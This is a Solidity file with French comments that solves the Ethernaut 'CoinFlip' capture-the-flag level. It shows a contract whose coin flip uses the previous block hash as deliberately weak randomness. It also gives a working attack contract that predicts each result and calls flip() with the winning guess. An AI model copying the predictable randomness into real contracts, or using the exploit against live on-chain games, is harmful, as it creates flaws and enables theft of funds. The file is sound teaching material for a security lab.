/*
Pour valider ce niveau, il faut arriver à obtenir 10 victoires consécutives (consecutivesWins doit être supérieur ou égal à 10).
*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'SafeMath/SafeMath.sol'; // Importation de la librairie SafeMath

contract CoinFlip {

  using SafeMath for uint256; // Usage du contrat SafeMath pour les variables de type uint256
  
  uint256 public consecutiveWins; // Création d'une variable consecutiveWins qui va stocker les victoires consécutives.
  
  uint256 lastHash; // Contiendra le dernier hash du (numéro de bloc actuel - 1)
  // Pourquoi bloc actuel - 1 ? Car on ne peut pas avoir le hash du bloc actuel. Donc on prend le dernier disponible, c'est-à-dire le bloc actuel - 1.
  
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; // Le facteur de division qui nous servira à obtenir 1 ou 0

  constructor() public { // Va initier consecutiveWins à 0 dès la création du contrat.
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) { //fonction flip qui a un bool en paramètre (qui correspond à pile ou face) et qui retourne un bool (true ou false).
    uint256 blockValue = uint256(blockhash(block.number.sub(1))); // blockValue va etre égal au hash du (bloc actuel - 1) (voir explication plus haut pour comprendre pourquoi bloc - 1)

    if (lastHash == blockValue) { // Pour éviter qu'on spam 10 fois d'un coup sur le meme bloc la fonction, du coup on a le droit à une tentative par bloc
      revert(); // revert la transaction dans ce cas
    }

    lastHash = blockValue; //pour que lastHash puisse arreter l'exécution de l'appel de la fonction si on joue encore le meme bloc
    
    uint256 coinFlip = blockValue.div(FACTOR); // équivalent de coinFlip = blockValue / FACTOR      -> permet d'avoir 1 ou 0
    
    bool side = coinFlip == 1 ? true : false; // si coinflip = 1 alors side = true, sinon side = false

    if (side == _guess) { // si side = notre prédiction, alors on a 1 victoire consécutive en plus
      consecutiveWins++;
      return true;
    } else { // sinon, ça remet le compteur de victoires consécutives à 0
      consecutiveWins = 0;
      return false;
    }
  }
}

/*
Du coup, on se rend compte que le soucis vient du bloc - 1.
En effet, c'est prédictible étant donné que tout le monde a accès au bloc - 1 et à son hash.
De ce fait, il suffit de créer une fonction qui va suivre le meme raisonnement en appelant la fonction flip avec en paramètre le résultat de side.
*/

contract attack {
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; // On va réutiliser le facteur pour pouvoir ensuite diviser
    
    // Cette variable ne contient rien pour le moment, mais lors de la création du contrat, 
    // le constructor va la rendre égale à l'adresse indiquée par le créateur du contrat (l'appelant)
    // l'appelant devra évidemment indiquer l'adresse du contrat CoinFlip qu'il aura créé sur EtherNaut en l'occurence, en faisant : await contract.address
    address public adresseCible; 
    
    // cf l'explication au-dessus de la variable adresseCible
    constructor (address _adresseCible) public {
        adresseCible = _adresseCible;
    }
    
    // Ici c'est la fonction qu'on va appeler et qui va elle-même recopier la fonction d'aléa du contrat CoinFlip nommée flip()
    function fliphack() public {
        
        // On va simplement récupérer le hash que le bloc précédent, comme le fait la fonction flip()
        uint256 blockValue = uint256(blockhash(block.number - 1)); 
        
        uint256 coinFlip = blockValue / FACTOR; // Puis on va diviser ce hash par notre variable FACTOR, comme le fait la fonction flip()
        
        bool side = (coinFlip == 1 ? true : false); // side est égal à true si coinFlip est égal à 1, sinon il est égal à 0, comme le fait la fonction flip()
        
        // On appelle la fonction flip du contrat CoinFlip en indiquant l'adresse du contrat pour que ce soit ce contrat qui l'exécute
        // Et en argument, on lui donne notre side de notre fonction fliphack(), qui va du coup contenir la bonne réponse à chaque fois
        
        CoinFlip(adresseCible).flip(side);
    }
}

/*
Il conviendra ensuite d'utiliser Remix ou un autre compilateur pour compiler le code, deployer le contrat et exécuter notre
fonction fliphack 10 fois, pour ensuite faire : (await contract.consecutiveWins()).toString()
Afin de vérifier si on en a bien 10 :)
*/








